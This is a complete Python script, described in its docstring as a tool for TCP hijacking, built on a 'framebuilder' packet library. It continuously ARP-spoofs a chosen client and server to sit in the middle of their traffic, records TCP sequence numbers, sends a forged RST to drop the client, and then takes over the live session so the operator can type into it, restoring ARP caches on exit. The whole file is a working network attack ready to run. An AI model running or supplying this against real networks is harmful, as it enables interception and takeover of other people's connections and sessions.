#!/usr/bin/env python3

'''Script for TCP hijacking'''

import time, sys, tty, termios, select
from framebuilder import eth, ipv4, tcp, tools, errors

def key_pressed():
    return select.select([sys.stdin], [], [], 0) == ([sys.stdin], [], [])

def print_err(msg):
    arg_str = 'interface client_ip server_ip server_port'
    print('Error:', msg)
    print(f'Usage: {sys.argv[0]} {arg_str}')

def check_args():
    if len(sys.argv) < 5:
        print_err('Missing arguments')
        sys.exit(1)
    if not tools.is_valid_ipv4_address(sys.argv[2]):
        print_err(f'Invalid IP address: {sys.argv[2]}')
        sys.exit(1)
    if not tools.is_valid_ipv4_address(sys.argv[3]):
        print_err(f'Invalid IP address: {sys.argv[3]}')
        sys.exit(1)
    try:
        _ = int(sys.argv[4])
    except ValueError:
        print_err(f'Invalid port number: {sys.argv[4]}')

def get_mac_addr(ip_addr, if_name):
    mac_addr = None
    if_mac = tools.get_mac_addr(if_name)
    if_ip = tools.get_if_ipv4_addr(if_name)
    gw = tools.get_route_gateway(ip_addr)
    if gw is not None:
        ip_addr = gw
    arp_sock = tools.create_socket(if_name)
    max_try = 5
    for num_try in range(max_try):
        try:
            mac_addr = tools.get_mac_for_dst_ip(ip_addr)
            if mac_addr is None:
                raise errors.FailedMACQueryException(f'IP {ip_addr}')
            return mac_addr
        except errors.FailedMACQueryException as e:
            # set an invalid ARP cache entry and try to update it
            tools.set_neigh(if_name, ip_addr)
            if num_try < max_try - 1:
                arp_data = {
                        'operation': 1,
                        'src_addr': if_mac,
                        'dst_addr': 'ff:ff:ff:ff:ff:ff',
                        'snd_hw_addr': if_mac,
                        #'snd_ip_addr': if_ip,
                        'snd_ip_addr': '0.0.0.0',
                        'tgt_hw_addr': '00:00:00:00:00:00',
                        'tgt_ip_addr': ip_addr
                        }
                arp_msg = eth.ArpMessage(arp_data)
                arp_msg.send(arp_sock)
                time.sleep(0.2)
            else:
                print(str(e))
                arp_sock.close()
                sys.exit(1)

def cut_off_client(if_name, client_ip, server_ip, client_port, server_port,
        seq_nr, ack_nr):
    ip_handler = ipv4.IPv4Handler(if_name, client_ip, server_ip)
    rst_seg = tcp.TCPSegment()
    rst_seg.src_port = server_port
    rst_seg.dst_port = client_port
    rst_seg.seq_nr = ack_nr
    rst_seg.ack_nr = seq_nr
    rst_seg.window = 1460
    rst_seg.rst = 1
    rst_seg.ack = 1
    ip_handler.send(rst_seg)

def print_seg(tcp_seg):
    seg_str = f'{tcp_seg.src_port}->{tcp_seg.dst_port} '
    seg_str += f'seq {tcp_seg.seq_nr} ack {tcp_seg.ack_nr}'
    tools.print_rgb(seg_str, (100, 150, 100), bold=True)

# validate parameters and initialize variables
check_args()
if_name = sys.argv[1]
client_ip = sys.argv[2]
server_ip = sys.argv[3]
client_port = 0
server_port = int(sys.argv[4])
seq_nr = 0
ack_nr = 0

ctime = 0
interval = 10**9

my_ip = tools.get_if_ipv4_addr(if_name)
if my_ip is None:
    print_err(f'Could not find IP address of interface {if_name}')
my_mac = tools.get_mac_addr(if_name)
client_mac = get_mac_addr(client_ip, if_name)
server_mac = get_mac_addr(server_ip, if_name)
arp_data_client = {'operation': 2,
        'src_addr': my_mac,
        'dst_addr': client_mac,
        'snd_hw_addr': my_mac,
        'snd_ip_addr': server_ip,
        'tgt_hw_addr': my_mac,
        'tgt_ip_addr': server_ip}
arp_msg_client = eth.ArpMessage(arp_data_client)
arp_data_server = {'operation': 2,
        'src_addr': my_mac,
        'dst_addr': server_mac,
        'snd_hw_addr': my_mac,
        'snd_ip_addr': client_ip,
        'tgt_hw_addr': my_mac,
        'tgt_ip_addr': client_ip}
arp_msg_server = eth.ArpMessage(arp_data_server)
eth_handler = eth.EthernetHandler(if_name, local_mac=my_mac, remote_mac=client_mac, block=0)
hijacked = False

tcp_handler = None
ch = chr(0)

# configure terminal and start
term_attr = termios.tcgetattr(sys.stdin)
try:
    tty.setcbreak(sys.stdin.fileno())
    new_tty_attr = termios.tcgetattr(sys.stdin)
    tools.print_rgb(f'Spoofing connections to {server_ip}:{server_port}',
            rgb=(200, 0, 0), bold=True)
    tools.print_rgb('press H to hijack the session...',
            rgb=(100, 100, 100), bold=False)
    while ord(ch) != 4: # 4 => ^D
        if time.time_ns() >= ctime + interval or ctime == 0:
            arp_msg_server.send(eth_handler.socket)
            arp_msg_client.send(eth_handler.socket)
            ctime = time.time_ns()
        frame, frame_type = eth_handler.receive(promisc=True)
        # don't process frames that we have sent ourselves (frame_type 4)
        if frame is not None and frame_type != 4:
            ip_pk = ipv4.IPv4Packet.from_frame(frame)
            tcp_seg = None
            if ip_pk.protocol == 6:
                tcp_seg = tcp.TCPSegment.from_packet(ip_pk)
            conditions  = [ip_pk.src_addr == client_ip,
                    ip_pk.dst_addr == client_ip,
                    ip_pk.src_addr == server_ip,
                    ip_pk.dst_addr == server_ip]
            if any(conditions):
                # forward frames to their real destination but skip those for
                # the hijacked connection
                if hijacked and tcp_seg is not None:
                    hijack_filter = [
                            ip_pk.src_addr == client_ip or \
                                    ip_pk.dst_addr == server_ip,
                            tcp_seg.src_port == client_port or \
                                    tcp_seg.dst_port == server_port
                                    ]
                    if all(hijack_filter):
                        continue
                elif tcp_seg is not None:
                    hijack_filter = [ip_pk.src_addr == client_ip,
                            ip_pk.dst_addr == server_ip,
                            tcp_seg.dst_port == server_port]
                    print_seg(tcp_seg)
                    if all(hijack_filter):
                        client_port = tcp_seg.src_port
                        seq_nr = tcp_seg.seq_nr
                        ack_nr = tcp_seg.ack_nr
                if frame.src_addr == server_mac and ip_pk.dst_addr != my_ip:
                    eth_handler.remote_mac = client_mac
                    eth_handler.send(ip_pk)
                if frame.src_addr == client_mac and ip_pk.dst_addr != my_ip:
                    eth_handler.remote_mac = server_mac
                    eth_handler.send(ip_pk)
        if key_pressed():
            ch = sys.stdin.read(1)
            if hijacked:
                if ord(ch) != 4:
                    tcp_handler.send(ch.encode())
            else:
                if ch in ('h', 'H'):
                    tools.print_rgb('entering hijacking mode',
                            rgb=(100, 100, 100), bold=False)
                    cut_off_client(if_name, client_ip, server_ip, client_port,
                            server_port, seq_nr, ack_nr)
                    # prepare TCP parameters and handler
                    tcp_handler = tcp.TCPHandler(if_name, client_port, server_ip)
                    tcp_handler.remote_port = server_port
                    tcp_handler.local_ip = client_ip
                    tcp_handler._rcv_nxt = ack_nr
                    tcp_handler._snd_nxt = seq_nr
                    tcp_handler._snd_una = seq_nr
                    tcp_handler._snd_wnd = 65535
                    tcp_handler._rem_rwnd = 65535
                    tcp_handler.state = tcp.TCPHandler.ESTABLISHED
                    hijacked = True
                    new_tty_attr[3] |= termios.ECHO
                    termios.tcsetattr(sys.stdin, termios.TCSANOW, new_tty_attr)
        if hijacked:
            data = tcp_handler.receive(65535)
            print(data.decode(), end='')
finally:
    termios.tcsetattr(sys.stdin, termios.TCSADRAIN, term_attr)
    if hijacked:
        tcp_handler.close()
    tools.print_rgb('\n\nCtrl-C -- Handing connections over...',
            rgb=(200, 0, 0), bold=True, end='')
    arp_data_client = {'operation': 2,
            'src_addr': my_mac,
            'dst_addr': client_mac,
            'snd_hw_addr': server_mac,
            'snd_ip_addr': server_ip,
            'tgt_hw_addr': server_mac,
            'tgt_ip_addr': server_ip}
    arp_msg_client = eth.ArpMessage(arp_data_client)
    arp_data_server = {'operation': 2,
            'src_addr': my_mac,
            'dst_addr': server_mac,
            'snd_hw_addr': client_mac,
            'snd_ip_addr': client_ip,
            'tgt_hw_addr': client_mac,
            'tgt_ip_addr': client_ip}
    arp_msg_server = eth.ArpMessage(arp_data_server)
    for i in range(3):
        arp_msg_server.send(eth_handler.socket)
        arp_msg_client.send(eth_handler.socket)
        time.sleep(0.1)
    tools.print_rgb('Done. Bye!',
            rgb=(200, 0, 0), bold=True)
